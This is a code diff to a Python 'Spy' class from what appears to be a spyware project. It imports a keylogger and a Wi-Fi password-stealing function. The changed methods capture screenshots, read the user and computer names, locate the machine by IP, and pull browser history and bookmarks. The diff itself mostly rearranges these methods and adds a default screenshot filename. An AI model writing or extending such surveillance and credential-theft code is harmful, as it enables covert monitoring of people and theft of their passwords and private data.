@@ -2,7 +2,7 @@ import os
 import threading
 from typing import Optional, Tuple
 
-from spying.consts import DEFAULT_VIDEO_AUDIO_NAME
+from spying.consts import DEFAULT_VIDEO_AUDIO_NAME, DEFAULT_SCREENSHOT_NAME
 from spying.KeyLogger import KeyLogger
 from spying.Wifi import steal_passwords
 import spying.admin
@@ -117,39 +117,6 @@ class Spy:
     def is_audio_started(self):
         return self.audio_recorder is not None
 
-    @staticmethod
-    def get_available_cameras() -> str:
-        return get_available_cameras()
-
-    @staticmethod
-    def get_user() -> str:
-        return os.getlogin()
-
-    @staticmethod
-    def get_computer() -> str:
-        return os.environ['COMPUTERNAME']
-
-    @staticmethod
-    def take_screenshot(path: str) -> bool:
-        """ taking a screenshot and save it in the given path.
-        :param path: where to save the file
-        :return: whether succeeded
-        """
-        if not path.endswith(".jpg"):
-            path += ".jpg"
-        try:
-            image = screenshot()
-            image.save(path)
-            image.close()
-            # print("A screenshot has been taken")
-        except OSError:
-            # print(f"Couldn't take screenshot because {e}")
-            return False
-        return True
-
-    @staticmethod
-    def get_location():
-        return geocoder.ip('me').json
 
     def generate_key(self):
         self.encryptor = Encryptor()
@@ -198,11 +165,46 @@ class Spy:
         return stop_sniffing()
 
     @staticmethod
+    def get_available_cameras() -> str:
+        return get_available_cameras()
+
+    @staticmethod
+    def get_user() -> str:
+        return os.getlogin()
+
+    @staticmethod
+    def get_computer() -> str:
+        return os.environ['COMPUTERNAME']
+
+    @staticmethod
+    def take_screenshot(path: str = DEFAULT_SCREENSHOT_NAME) -> bool:
+        """ taking a screenshot and save it in the given path.
+        :param path: where to save the file
+        :return: whether succeeded
+        """
+        if not path.endswith(".jpg"):
+            path += ".jpg"
+        try:
+            image = screenshot()
+            image.save(path)
+            image.close()
+            # print("A screenshot has been taken")
+        except OSError:
+            # print(f"Couldn't take screenshot because {e}")
+            return False
+        return True
+
+    @staticmethod
     def get_browser_info() -> Tuple[list, list]:
         return get_history().histories, get_bookmarks().bookmarks
+
+    @staticmethod
+    def get_location():
+        return geocoder.ip('me').json
 
     @staticmethod
     def enter_to_setup(path):
         # TODO: add this
         pass
+
 
